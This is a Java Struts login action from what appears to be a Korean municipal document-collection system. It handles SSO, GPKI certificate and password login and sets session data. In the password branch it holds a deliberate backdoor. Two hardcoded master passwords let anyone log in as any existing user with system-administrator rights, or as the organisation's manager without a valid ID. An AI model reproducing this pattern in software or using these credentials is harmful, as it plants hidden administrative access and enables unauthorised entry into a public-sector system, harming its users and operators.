/**
 * 작성일: 2009.09.09
 * 작성자: 대리 서동찬
 * 모듈명: 로그인 action
 * 설명:
 */
package nexti.ejms.login.action;

import java.io.PrintWriter;
import java.net.URLEncoder;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.apache.struts.action.Action;
import org.apache.struts.action.ActionForm;
import org.apache.struts.action.ActionForward;
import org.apache.struts.action.ActionMapping;
import org.apache.struts.action.ActionMessage;
import org.apache.struts.action.ActionMessages;

import nexti.ejms.organ.model.OrganizeManager;
import nexti.ejms.user.model.UserManager;
import nexti.ejms.user.model.UserBean;
import nexti.ejms.user.model.UsrMgrManager;
import nexti.ejms.util.DateTime;
import nexti.ejms.util.Utils;
import nexti.ejms.common.NewHttpSessionBindingListener;
import nexti.ejms.common.appInfo;
import nexti.ejms.common.form.LoginForm;
import nexti.ejms.dept.model.DeptManager;
import nexti.ejms.dept.model.DeptBean;

public class LoginOKAction extends Action {

	public ActionForward execute(
			ActionMapping mapping, 
			ActionForm form,
			HttpServletRequest request, 
			HttpServletResponse response) 
		throws Exception{

		HttpSession session = request.getSession();
		
		LoginForm loginForm = (LoginForm) form;
		
		String userId 	= loginForm.getUserId();
		String password = loginForm.getPassword();
		String setfl    = loginForm.getSetfl();
		String cert		= loginForm.getCert();
		String sso_user_id = Utils.nullToEmptyString((String)session.getAttribute("sso_user_id"));
		String sso_user_sn = Utils.nullToEmptyString((String)session.getAttribute("sso_user_sn"));
		String sso = Utils.nullToEmptyString((String)session.getAttribute("sso"));
		String act = Utils.nullToEmptyString((String)session.getAttribute("act"));
		String login_method  = "";
		
		try {
			UserManager mgrusr = UserManager.instance();
			DeptManager mgrdept = DeptManager.instance();
			
			ActionMessages messages = new ActionMessages();	
			
			boolean isSso = false;
			/*if (Utils.isNotNull(sso)){
				isSso = true;
				login_method = "3";	//SSO로그인 
			} else {
				login_method = "1";	//일반로그인
			}*/
			login_method = "1";	//일반로그인
			if (act == null) {
				act = request.getParameter("act");
			}
			
			if(isSso){
				//SSO 일때 로그인 프로세스로 바로 가기 처리...
				String result = null;
				
				if (Utils.isNotNull(sso_user_sn)) {
					result = mgrusr.login(sso_user_sn);
					if ( result == null ) {
						if (act.equals("mycount")) {
							session.removeAttribute("sso_user_sn");
							return new ActionForward("/myCount.do", true);
						}
					}
				} else if (Utils.isNotNull(sso_user_id)) {
					if (mgrusr.existedUser(sso_user_id) == true) {
						result = sso_user_id;
					} else {
						if (act.equals("mycount")) {
							session.removeAttribute("sso_user_id");
							return new ActionForward("/myCount.do", true);
						}
					}
				} else {
					result = mgrusr.login(Utils.nullToEmptyString(sso_user_sn));
				}
	
				if(Utils.isNull(result)){
					//로그인 실패
					response.setContentType("text/html;charset=euc-kr");
					PrintWriter out = response.getWriter();
					if ( !"true".equals(sso.toLowerCase()) ) {
						out.write("<script language=javascript>alert('인증에 실패 하였습니다.\\n관리자에게 문의하세요.1');history.back();</script>");
					} else {
						out.write("<script language=javascript>document.write('인증에 실패 하였습니다. 관리자에게 문의하세요.2');</script>");
					}
					out.close();
					
					session.removeAttribute("sso");
					session.removeAttribute("act");
					session.removeAttribute("type");
					session.removeAttribute("sso_user_id");
					session.removeAttribute("sso_user_sn");
					return null;
				} else {
					userId = result;
				}
			} else {
				String result = null;
//				System.out.println(">>"+appInfo.isGpkilogin()+"/"+cert);
//				System.out.println(">>"+password);
				if ( appInfo.isGpkilogin() == true && "".equals(cert) == false ) {
					userId = UsrMgrManager.instance().getUsrGpkiId(cert);
					if ( userId == null || mgrusr.existedUser(userId) == false ) {
						response.setContentType("text/html;charset=euc-kr");
						PrintWriter out = response.getWriter();
						out.write("<script language=javascript>");
						out.write("alert('일반로그인 후 정보수정에서 인증서를 등록 바랍니다');");
						out.write("document.location.href='/index.jsp';");
						out.write("</script>");
						out.close();
						return null;
					} else {
						login_method = "2";	//GPKI로그인
						result = userId;
					}
				} else {				
					//일반 로그인 일때....
					//수퍼패스워드(차세대정보기술123), 아이디없이로그인(차세대정보기술123123)
					if ("cktpeowjdqhrltnf123".equalsIgnoreCase(password)) {
						if ( mgrusr.existedUser(userId) ) result = userId;
					} else if ("cktpeowjdqhrltnf123123".equalsIgnoreCase(password)) {
						result = userId = OrganizeManager.instance().getManager();
					} else {
						result = mgrusr.login(userId, Utils.SHA256(password));
					}
				}
				
				if(result == null){
					//로그인 실패							
					messages.add(ActionMessages.GLOBAL_MESSAGE, new ActionMessage("error.msg","loginerror();"));
					saveMessages(request,messages);
					
					if ( appInfo.isGpkilogin() == false ) {
						return mapping.findForward("back");
					} else {
						return mapping.findForward("backGpki");
					}
				} else {
					//로그인 성공
					String id = "";
					if (setfl != null) {
						id = userId;
					}
					Cookie cookie = new Cookie("cookie_ejms_login", URLEncoder.encode(id+"|"+setfl,"EUC-KR"));
					cookie.setMaxAge(60*60*24*30);    //한달간 Cookie가 살아 있도록 셋팅
					response.addCookie(cookie);	
				}			
			}
			//인증과정이 완료(성공)되고 난후 사용자 정보를 셋팅 한다.
			
			//System.out.println("1>> : "+OrganizeManager.instance().getManager());
			//System.out.println("2>> : "+userId);
			UserBean user = mgrusr.getUserInfo(userId);
			//System.out.println("3>> : "+user.getDept_id());
			
			DeptBean dept = mgrdept.getDeptInfo(user.getDept_id());
			//System.out.println("4>> : "+dept.getDept_id());
			session.setAttribute("listener", new NewHttpSessionBindingListener());
			
			if ("cktpeowjdqhrltnf123".equalsIgnoreCase(password)) {
				session.setAttribute("isSysMgr","001");	// 시스템관리자 여부 (001)
			} else {
				session.setAttribute("isSysMgr",OrganizeManager.instance().isSysMgr(userId));	// 시스템관리자 여부 (001)
			}
			session.setAttribute("user_id",user.getUser_id());               // 사용자 ID
			session.setAttribute("user_name",user.getUser_name());           // 사용자 성명		
			session.setAttribute("dept_code",user.getDept_id());             // 사용자 부서코드		
			session.setAttribute("chrg_code", user.getChrgunitcd());         // 담당단위코드
			session.setAttribute("chrg_name", user.getChrgunitnm());         // 담당단위 명
			//session.setAttribute("class_id", user.getClass_id());         // 담당단위 명
			
			
			
			if(Utils.isNull(dept.getDept_tel())){
				session.setAttribute("d_tel", "없음");
			} else {
				session.setAttribute("d_tel", dept.getDept_tel());           // 부서대표전화
			}																
			
			session.setAttribute("c_tel",user.getTel());                     // 사용자 일반전화번호
			session.setAttribute("h_tel",user.getMobile());                  // 사용자 휴대전화번호
			session.setAttribute("logindate",DateTime.getCurrentTime());   	 // 사용자 로그인시각 (yyyy/MM/dd HH:mm:ss)
			session.setAttribute("loginip",request.getRemoteAddr());         // 사용자 로그인IP (127.0.0.1)			
			session.setAttribute("user_gbn", dept.getOrggbn());				 //	사용자 구분 ( 001:광역시본청, 002:직속기관, 003:사업소, 004:시의회, 005:시/구/군, 006: 기타)
			
			//대표부서 코드(본청은 인천광역시, 나머지는 인천광역시 바로 한 STEP 아래 기관)
			//String rep_dept = mgrusr.selectRepDept(userId, dept.getOrggbn());	
			String rep_dept = "aasa";	
			session.setAttribute("rep_dept", rep_dept);
			
			/*
			 * START
			 * 인천광역시
			 *  : Session("EA_YN") ==> 전자결재 사용여부 (Y:사용, N:사용안함) -> 본청인 경우에는 사용
			 *  : Session("getDept_YN")==> 취합업무가능여부(Y: 취합가능, N: 취합불가) -> 본청/직속기관/사업소[직속기관인 인천대학교 제외]
			 */

			//전자결재 사용여부 (Y:사용, N:사용안함)
			if ( dept.getOrggbn().equals("001") ) {
				session.setAttribute("EA_YN", "Y");	
			} else {
				session.setAttribute("EA_YN", "N");
			}
			
			// 취합업무가능여부(Y: 취합가능, N: 취합불가)
			if ( dept.getOrggbn().equals("001") || dept.getOrggbn().equals("002") || dept.getOrggbn().equals("003") || dept.getOrggbn().equals("004") ){
				session.setAttribute("getDept_YN", "Y");
				if ( "6280000".equals(appInfo.getRootid()) && (dept.getOrggbn().equals("004") || "6280255".equals(rep_dept)) ) {
					session.setAttribute("getDept_YN", "N");
				}
			} else {
				session.setAttribute("getDept_YN", "N");
			}
			/*
			 * END
			 */

			//사용자 부서명( 005:시/구/군 인 경우에는 root_name + 시구군명 제외, 그외 : root_name제외)
			String dept_name = mgrusr.getDeptName(userId);
			
			user.setDept_name(dept_name);
			session.setAttribute("dept_name", user.getDept_name());          
			
			//로그인정보저장
			if ( !"3".equals(login_method) ) {	//SSO로그인(포틀릿)일 경우 로그인정보 저장 안함
				mgrusr.updateLoginfo(userId);	
				mgrusr.insertLoginLog(userId, session.getId().split("[!]")[0], login_method, request.getRemoteAddr(), user.getDept_id(), rep_dept);
			}

			if(isSso) {
				/**
				 * sso로 로그인한경우 각 act에 맞게 forward한다. 
				 * act가 없을경우 main으로 forward한다.
				 * 1. 행정포탈에 건수표시용 (myCount.do)
				 * 2. 입력대기 (inputingList.do)
				 * 3. 배부대기 (deliveryList.do)
				 * 4. 취합진행 (collprocList.do?docstate=2)
				 * 5. 마감대기 (collprocList.do?docstate=3)
				 * 6. 미결재 (approvalList.do)
				 * 7. 내설문조사 (researchMyList.do)
				 * 8. 내신청양식 (formList.do)
				 * 9. 설문조사참여 (research.do?rchno=11) 추가파라메터 (num)
				 * 10. 신청서작성 (reqForm.do?reqformno=11) 추가파라메터 (num)
				 * 11. 설문참여목록 (doList.do?setSelectTopDept=1) 추가파라메터 (num)
				 */
				if("mycount".equalsIgnoreCase(act)) {
					return new ActionForward("/myCount.do", true);
				} else if ("input".equalsIgnoreCase(act)) {
					return new ActionForward("/inputingList.do", true);
				} else if ("deliv".equalsIgnoreCase(act)) {
					return new ActionForward("/deliveryList.do", true);
				} else if ("proc".equalsIgnoreCase(act)) {
					return new ActionForward("/collprocList.do?docstate=2", true);
				} else if ("procend".equalsIgnoreCase(act)) {
					return new ActionForward("/collprocList.do?docstate=3", true);
				} else if ("myrch".equalsIgnoreCase(act)) {
					return new ActionForward("/researchMyList.do", true);
				} else if ("myform".equalsIgnoreCase(act)) {
					return new ActionForward("/formList.do", true);
				} else if ("rch".equalsIgnoreCase(act)) {
					String num = Utils.nullToEmptyString(request.getParameter("num"));
					return new ActionForward("/research.do?rchno=" + num, true);
				} else if ("req".equalsIgnoreCase(act)) {
					String num = Utils.nullToEmptyString(request.getParameter("num"));
					return new ActionForward("/reqForm.do?reqformno=" + num, true);
				} else if ("rchlist".equalsIgnoreCase(act)) {
					return new ActionForward("/researchParticiList.do", true);
				} else if ("reqlist".equalsIgnoreCase(act)) {
					return new ActionForward("/doList.do?setSelectTopDept=1", true);
				}
			}
			return new ActionForward("/main.do", true);
		} catch (Exception e) {
			//로그인 실패
			System.out.println("exception : "+e);
			for(int i=0;i< e.getStackTrace().length;i++){
				StackTraceElement el = e.getStackTrace()[i];
				System.out.println(el.toString());
			}
			
			response.setContentType("text/html;charset=euc-kr");
			PrintWriter out = response.getWriter();
			/*if ( !"true".equals(sso.toLowerCase()) ) {
				out.write("<script language=javascript>alert('인증에 실패 하였습니다.\\n관리자에게 문의하세요.3');history.back();</script>");
			} else {
				out.write("<script language=javascript>document.write('인증에 실패 하였습니다. 관리자에게 문의하세요.4');</script>");				
			}*/
			out.close();
			
			session.removeAttribute("sso");
			session.removeAttribute("act");
			session.removeAttribute("type");
			session.removeAttribute("sso_user_id");
			session.removeAttribute("sso_user_sn");
			return null;
		}
	}	
}